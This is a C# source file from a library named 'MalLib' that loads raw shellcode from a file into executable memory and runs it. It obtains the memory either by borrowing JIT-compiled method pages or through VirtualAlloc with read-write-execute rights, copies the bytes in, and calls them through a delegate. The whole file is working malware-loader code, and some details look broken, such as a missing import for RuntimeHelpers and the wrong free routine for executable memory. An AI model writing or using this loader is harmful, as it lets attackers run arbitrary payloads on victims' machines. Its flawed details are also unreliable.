using System;
using System.IO;
using System.Reflection;
using System.Reflection.Emit;
using System.Runtime.InteropServices;

namespace MalLib
{
    public static class Exports
    {
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate void Callback();

        [DllImport("kernel32.dll", EntryPoint = "RtlMoveMemory", SetLastError = false)]
        private static extern void RtlMoveMemory(IntPtr dest, IntPtr src, IntPtr byteCount);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr VirtualAlloc(IntPtr lpAddress, IntPtr dwSize, uint flAllocationType, uint flProtect);

        private const uint MEM_COMMIT = 0x1000;
        private const uint MEM_RESERVE = 0x2000;
        private const uint PAGE_EXECUTE_READWRITE = 0x40;

        private static IntPtr GenerateRWXMemory(int byteCount)
        {
            AssemblyName name = new AssemblyName("Assembly");
            AssemblyBuilder ab = AppDomain.CurrentDomain.DefineDynamicAssembly(name, AssemblyBuilderAccess.Run);
            ModuleBuilder mb = ab.DefineDynamicModule("Module", true);
            MethodBuilder methodBuilder = mb.DefineGlobalMethod(
                "MethodName",
                MethodAttributes.FamANDAssem | MethodAttributes.Family | MethodAttributes.Static,
                typeof(void),
                new Type[0]);
            ILGenerator il = methodBuilder.GetILGenerator();
            Random random = new Random();
            while (byteCount > 0)
            {
                var sb = new System.Text.StringBuilder();
                for (int i = 0; i < 4; i++)
                    sb.Append((char)('A' + (int)(25.0 * random.NextDouble())));
                il.EmitWriteLine(sb.ToString());
                byteCount -= 18;
            }
            il.Emit(OpCodes.Ret);
            mb.CreateGlobalFunctions();
            RuntimeMethodHandle mh = mb.GetMethods()[0].MethodHandle;
            RuntimeHelpers.PrepareMethod(mh);
            return mh.GetFunctionPointer();
        }

        private static int MeasureBuffer(IntPtr mem)
        {
            for (int n = 0; n < 4096; n++)
            {
                try
                {
                    byte b = Marshal.ReadByte(mem, n);
                    if (b == 0xC3)
                    {
                        byte b1 = n > 0 ? Marshal.ReadByte(mem, n - 1) : (byte)0;
                        byte b2 = n > 1 ? Marshal.ReadByte(mem, n - 2) : (byte)0;
                        if ((b2 == 0xCC && b1 == 0xCC) || b1 == 0xCC)
                            return n - 1;
                        return n + 1;
                    }
                }
                catch { return n; }
            }
            return 0;
        }

        private static IntPtr Realloc(IntPtr oldMem, int oldSize, int newSize)
        {
            IntPtr newMem = VirtualAlloc(IntPtr.Zero, (IntPtr)newSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            RtlMoveMemory(newMem, oldMem, (IntPtr)oldSize);
            return newMem;
        }

        private static IntPtr AllocateBuffer(int size)
        {
            IntPtr mem = GenerateRWXMemory(size);
            int actual = MeasureBuffer(mem);
            if (actual < size)
                mem = Realloc(mem, actual, size + 4096);
            return mem;
        }

        private static void CopyToBuffer(byte[] source, IntPtr dest)
        {
            IntPtr src = Marshal.AllocHGlobal(source.Length);
            try
            {
                Marshal.Copy(source, 0, src, source.Length);
                RtlMoveMemory(dest, src, (IntPtr)source.Length);
            }
            finally
            {
                Marshal.FreeHGlobal(src);
            }
            Array.Clear(source, 0, source.Length);
        }

        private static IntPtr LoadFromFile(string path)
        {
            if (!File.Exists(path))
                return IntPtr.Zero;
            byte[] shellcode = File.ReadAllBytes(path);
            IntPtr mem = AllocateBuffer(shellcode.Length);
            CopyToBuffer(shellcode, mem);
            return mem;
        }

        private static void RunShellcode(IntPtr mem)
        {
            Callback fn = Marshal.GetDelegateForFunctionPointer<Callback>(mem);
            fn();
        }

        private static void RunShellcodeWithArgs(IntPtr mem, int size)
        {
            var fn = Marshal.GetDelegateForFunctionPointer<CallbackWithArgs>(mem);
            fn(mem, size);
        }

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate void CallbackWithArgs(IntPtr payload, int size);

        public static void RunShellcodeFromFile(string path)
        {
            IntPtr mem = LoadFromFile(path);
            if (mem != IntPtr.Zero)
                RunShellcode(mem);
        }

        public static IntPtr LoadShellcodeFile(string path)
        {
            return LoadFromFile(path);
        }

        public static IntPtr AllocateRWX(int size)
        {
            return AllocateBuffer(size);
        }

        public static void FreeBuffer(IntPtr mem)
        {
            if (mem != IntPtr.Zero)
                Marshal.FreeHGlobal(mem);
        }

        public static void CopyToBuffer(IntPtr mem, IntPtr data, int size)
        {
            if (mem == IntPtr.Zero || data == IntPtr.Zero || size <= 0)
                return;
            var buf = new byte[size];
            Marshal.Copy(data, buf, 0, size);
            CopyToBuffer(buf, mem);
        }

        public static void ExecuteBuffer(IntPtr mem)
        {
            if (mem != IntPtr.Zero)
                RunShellcode(mem);
        }

        public static void ExecuteBufferWithArgs(IntPtr mem, int size)
        {
            if (mem != IntPtr.Zero && size > 0)
                RunShellcodeWithArgs(mem, size);
        }
    }
}
